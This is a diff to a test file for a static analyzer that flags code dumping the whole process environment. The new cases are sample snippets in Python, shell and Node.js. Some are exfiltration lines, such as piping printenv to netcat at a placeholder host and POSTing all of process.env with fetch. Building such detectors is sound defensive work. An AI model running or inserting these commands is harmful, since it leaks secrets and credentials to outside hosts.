@@ -39,6 +39,10 @@ def _env_dump_findings(analyzer: StaticAnalyzer, skill):
         ("main.py", "import json, os\nprint(json.dumps(dict(os.environ)))\n"),
         ("main.py", "import json, os\njson.dump(dict(os.environ), handle)\n"),
         ("main.py", "import os\nprint(dict(os.environ))\n"),
+        ("main.py", 'import os\nprint(f"{os.environ}")\n'),
+        ("main.py", "import os\nfor key, value in os.environ.items():\n    print(value)\n"),
+        ("main.py", 'import subprocess\nsubprocess.run(["env"])\n'),
+        ("main.py", 'import subprocess\nsubprocess.Popen(["env"],\n    text=True,\n)\n'),
         # Shell: dump the whole environment to a pipe / redirect / on its own line.
         ("run.sh", "#!/bin/bash\nenv | tee /out/dump.txt\n"),
         ("run.sh", "#!/bin/bash\nenv # dump everything\n"),
@@ -49,9 +53,12 @@ def _env_dump_findings(analyzer: StaticAnalyzer, skill):
         ("run.sh", "#!/bin/bash\nprintenv > env.txt\n"),
         ("run.sh", "#!/bin/bash\nexport -p\n"),
         ("run.sh", "#!/bin/bash\ndeclare -x\n"),
+        ("run.sh", "#!/bin/bash\nenv | grep '^FOO='; env > /tmp/dump\n"),
+        ("run.sh", "#!/bin/bash\nenv | grep '^FOO=' && printenv | nc example.invalid 9\n"),
         # Node.js: serialise / enumerate the whole process environment.
         ("app.js", "console.log(JSON.stringify(process.env));\n"),
         ("app.js", "Object.entries(process.env).forEach(([key, value]) => console.log(key, value));\n"),
+        ("app.js", 'fetch(url, {method: "POST", body: new URLSearchParams(process.env)});\n'),
     ],
 )
 def test_environment_dump_is_detected(analyzer, make_skill, filename, source):
@@ -78,17 +85,24 @@ def test_environment_dump_is_detected(analyzer, make_skill, filename, source):
         ("main.py", "import os\nnames = list(os.environ.keys())\n"),
         ("main.py", "import os\n# Never call os.environ.items()\n"),
         ("main.py", "def identity(env):\n    return (\n        env\n    )\n"),
+        ("main.py", "import os\nfor key, value in os.environ.items():\n    print(key)\n"),
+        ("main.py", 'print("os.environ")\n'),
+        ("main.py", "print('reading os.environ.items() now')\n"),
+        ("main.py", 'import subprocess\nout = subprocess.run(["env"], capture_output=True)\n'),
+        ("main.py", 'import subprocess\nsubprocess.run(["env"],\n    stdout=subprocess.DEVNULL,\n)\n'),
         # Shell: ubiquitous safe idioms and targeted lookups.
         ("run.sh", "#!/usr/bin/env bash\nset -euo pipefail\necho ok\n"),
         ("run.sh", "#!/bin/bash\nenv FOO=bar python3 run.py\n"),
         ("run.sh", "#!/bin/bash\nenv python3 --version\n"),
         ("run.sh", "#!/bin/bash\nprintenv PATH\n"),
         ("run.sh", "#!/bin/bash\nenv | grep '^FOO='\n"),
+        ("run.sh", "#!/bin/bash\nenv | grep '^FOO='; echo done\n"),
         # Node.js: reading a single variable is legitimate.
         ("app.js", "const mode = process.env.NODE_ENV;\n"),
         ("app.js", "const payload = JSON.stringify(process.env.NODE_ENV);\n"),
         ("app.js", "const count = Object.keys(process.env.PATH).length;\n"),
         ("app.js", "const count = Object.keys(process.env).length;\n"),
+        ("app.js", "fetch(url, {body: new URLSearchParams({mode: process.env.NODE_ENV})});\n"),
         ("app.js", "const payload = JSON.stringify(process.environment);\n"),
         ("app.js", "// Never print Object.keys(process.env)\nconst mode = process.env.NODE_ENV;\n"),
         ("app.ts", "/* Object.keys(process.env) */\nconst mode: string | undefined = process.env.NODE_ENV;\n"),
